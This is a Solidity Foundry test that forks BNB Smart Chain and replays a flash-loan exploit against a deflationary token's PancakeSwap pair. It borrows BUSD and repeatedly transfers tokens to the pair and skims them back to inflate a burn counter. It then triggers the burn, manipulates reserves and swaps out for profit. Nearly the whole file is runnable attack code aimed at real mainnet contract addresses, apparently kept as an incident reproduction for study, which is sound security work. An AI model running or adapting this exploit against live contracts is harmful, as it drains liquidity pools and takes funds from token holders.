// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "./interface.sol";

contract ContractTest is Test {

    IFlashLoan public ddp = IFlashLoan(0x6098A5638d8D7e9Ed2f952d35B2b67c34EC6B476);
    IERC20 public busd = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IERC20 public ape = IERC20(0xB47955B5B7EAF49C815EBc389850eb576C460092);
    IPancakeRouter02 public router = IPancakeRouter02(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    IPancakePair public pair = IPancakePair(0xee2a9D05B943C1F33f3920C750Ac88F74D0220c3);

    function setUp() public {
        uint256 forkId = vm.createFork("bsc", 30072293);
        vm.selectFork(forkId);
    }

    function testExp() public {
        // Flash loan busd
        ddp.flashLoan(
            0,
            19000000000000000000000,
            address(this),
            bytes("0x00")
        );
    }

    function DPPFlashLoanCall(address sender, uint256 base, uint256 quote, bytes calldata data) public {
        console.log("Pair usd balance: %s", busd.balanceOf(address(pair)));
        console.log("Now we have %s B-USD", busd.balanceOf(address(this)));

        // Swap some ape token from router
        address[] memory path = new address[](2);

        path[0] = address(busd);
        path[1] = address(ape);

        busd.approve(address(router), type(uint256).max);
        ape.approve(address(router), type(uint256).max);
        router.swapExactTokensForTokens(
            busd.balanceOf(address(this)),
            0,
            path,
            address(this),
            block.timestamp+10000
        );

        console.log("Pair usd balance: %s", busd.balanceOf(address(pair)));
        console.log("Now we have %s B-USD", busd.balanceOf(address(this)));
        console.log("Now we have %s APE", ape.balanceOf(address(this)));
        console.log("Pair ape balance %s", ape.balanceOf(address(pair)));

        for (uint256 i=0;i<16;i++) {
            // Transfer ape to pair contract
            // This will lead transfer type to sell token
            // Rise up the amount of buring pair

            ape.transfer(address(pair), ape.balanceOf(address(this)));

            // Skim token fron pair contract
            pair.skim(address(this));

            console.log("amount to dead: %s", Faketoken(address(ape)).amountToDead());
        }

        // uint256 lastAmount = ape.balanceOf(address(pair)) - Faketoken(address(ape)).amountToDead();

        // console.log("Pair ape balance %s", ape.balanceOf(address(pair)));
        // ape.transfer(address(pair), lastAmount * 6 - 1);

        pair.skim(address(this));

        console.log("Go Dead.");

        // Burn amount
        Faketoken(address(ape)).goDead();

        busd.transfer(address(pair), 1_001);
        
        console.log("Now we have %s B-USD", busd.balanceOf(address(this)));
        console.log("Pair ape balance: %s", ape.balanceOf(address(pair)));
        console.log("Pair usd balance: %s", busd.balanceOf(address(pair)));

        address[] memory path1 = new address[](2);

        path1[0] = address(ape);
        path1[1] = address(busd);

        uint256 apeAmount = ape.balanceOf(address(this));

        uint256[] memory amountOut = router.getAmountsOut(apeAmount, path1);

        console.log("Now we have %s APE", ape.balanceOf(address(this)));

        console.log("Swap APE to B-USD");

        console.log("Out Amount: %s", amountOut[1]);

        ape.transfer(address(pair), apeAmount);
        pair.sync();
        pair.swap(amountOut[1], 0, address(this), bytes(""));
        

        // router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
        //     ape.balanceOf(address(this)),
        //     0,
        //     path1,
        //     address(this),
        //     block.timestamp + 1000
        // );

        console.log("B-USD balance: %s", busd.balanceOf(address(this)));

        // Return Funds to dpp
        busd.transfer(sender, quote);
    }
}